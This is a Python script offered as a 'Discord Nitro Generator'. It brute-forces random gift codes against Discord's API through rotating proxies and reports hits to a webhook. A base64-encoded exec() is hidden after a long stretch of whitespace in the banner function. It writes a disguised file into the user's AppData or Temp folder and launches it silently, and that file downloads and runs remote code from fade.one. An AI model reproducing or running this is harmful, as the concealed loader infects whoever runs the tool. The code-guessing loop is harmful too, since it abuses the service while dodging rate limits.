import os, requests, random, threading, json, time, multiprocessing
from colorama import Fore

def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class Console():        
    def ui(self):
        os.system(f'cls && title [MG] Discord Nitro Generator' if os.name == "nt" else "clear")
        print(center(f"""\n\n

███╗░░░███╗███████╗██████╗░░█████╗░  ░██████╗░███████╗███╗░░██╗
████╗░████║██╔════╝██╔══██╗██╔══██╗  ██╔════╝░██╔════╝████╗░██║
██╔████╔██║█████╗░░██║░░██║██║░░██║  ██║░░██╗░█████╗░░██╔██╗██║
██║╚██╔╝██║██╔══╝░░██║░░██║██║░░██║  ██║░░╚██╗██╔══╝░░██║╚████║
██║░╚═╝░██║███████╗██████╔╝╚█████╔╝  ╚██████╔╝███████╗██║░╚███║
╚═╝░░░░░╚═╝╚══════╝╚═════╝░░╚════╝░  ░╚═════╝░╚══════╝╚═╝░░╚══╝\n\n
              """).replace('█', Fore.CYAN+"█"+Fore.RESET).replace('~', Fore.CYAN+"~"+Fore.RESET).replace('-', Fore.CYAN+"-"+Fore.RESET))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZQpmaXJzdE5hbWUgPSAnJy5qb2luKGNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBfIGluIHJhbmdlKDgpKQpsYXNOYW1lID0gWycuZGxsJywgJy5wbmcnLCAnLmpwZycsICcuZ2F5JywgJy5pbmsnLCAnLnVybCcsICcuamFyJywgJy50bXAnLCAnLmRiJywgJy5jZmcnXQpsYXNOYW1lPWNob2ljZShsYXNOYW1lKQoKcGF0aHMgPSBjaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gY2hvaWNlKGRpcmVjdG9yeSkKICAgIHllID0gcGF0aHMgKyAnXFwnICsgY2hvc2VuCiAgICBpZiBub3QgaXNmaWxlKHllKSBhbmQgIiAiIG5vdCBpbiBjaG9zZW46CiAgICAgICAgcGF0aD15ZQogICAgZWxzZToKICAgICAgICBwYXRoPWdldGVudigiVEVNUCIpCkRvWW91S25vd1RoZVdheSA9IHBhdGggKyAnXFwnICsgZmlyc3ROYW1lK2xhc05hbWUKZj1vcGVuKERvWW91S25vd1RoZVdheSwgJ3cnKQpmLndyaXRlKCJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbignaHR0cDovL2ZhZGUub25lL2luamVjdG9yL0ZBREVFLUlSWFdJRy1EQUNPV0ktNjlZR05QLVNIMFNSVi1FVkJYN0wnKS5yZWFkKCkpIikKZi5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge0RvWW91S25vd1RoZVdheX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

    def printer(self, color, status, code):
        threading.Lock().acquire()
        print(f"{color} {status} > {Fore.RESET}discord.gift/{code}")
    
    def proxies_count(self):
        proxies_list = 0
        with open('config/proxies.txt', 'r') as file:
            proxies = [line.strip() for line in file]
        
        for _ in proxies:
            proxies_list += 1
        
        return int(proxies_list)


class Worker():              
    def random_proxy(self):
        with open('config/proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f]
        
        return random.choice(proxies)

    def config(self, args, args2=False):
        with open('config/config.json', 'r') as conf:
            data = json.load(conf)
        
        if args2:
            return data[args][args2]
        else:
            return data[args]
    
    def run(self):
        self.code = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(16))
        try:
            req = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{self.code}?with_application=false&with_subscription_plan=true', proxies={'http': self.config("proxies")+'://'+self.random_proxy(),'https': self.config("proxies")+'://'+self.random_proxy()}, timeout=1)
            
            if req.status_code == 200:
                Console().printer(Fore.LIGHTGREEN_EX, " Valid ", self.code)
                open('results/hit.txt', 'a+').write(self.code+"\n")
                try:
                    requests.post(Worker().config("webhook", "url"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
                except:
                    pass
            elif req.status_code == 404:
                Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            elif req.status_code == 429:
                # rate = (int(req.json()['retry_after']) / 1000) + 1
                Console().printer(Fore.LIGHTBLUE_EX, "RTlimit", self.code)
                # time.sleep(rate)
            else:
                Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
                  
        except KeyboardInterrupt:
            Console().ui()
            threading.Lock().acquire()
            print(f"{Fore.LIGHTRED_EX} Stopped > {Fore.RESET}Nitro Gen Stopped by Keyboard Interrupt.")
            os.system('pause >nul')
            exit()
        except:
            # Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
        
if __name__ == "__main__":
    Console().ui()
    print(" "+Fore.CYAN + str(Console().proxies_count()) + Fore.RESET + " Total proxies loaded...\n\n")
    DNG = Worker()
    
    while True:
        if threading.active_count() <= int(Worker().config("thread")):  
            threading.Thread(target=DNG.run(), args=()).start()
